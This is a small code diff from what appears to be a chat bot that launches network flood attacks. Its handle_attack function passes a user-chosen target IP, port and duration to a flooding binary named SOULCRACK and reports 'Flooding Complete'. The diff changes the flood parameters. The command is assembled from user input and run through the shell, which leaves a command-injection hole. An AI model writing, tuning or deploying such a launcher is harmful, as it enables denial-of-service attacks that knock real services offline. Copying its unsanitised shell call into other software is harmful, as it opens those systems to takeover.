@@ -236,7 +236,7 @@ def handle_attack(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./SOULCRACK {target} {port} {time} 100"
+                full_command = f"./SOULCRACK {target} {port} {time} 1024 900"
                 subprocess.run(full_command, shell=True)
                 response = f"Flooding Complete"
         else:
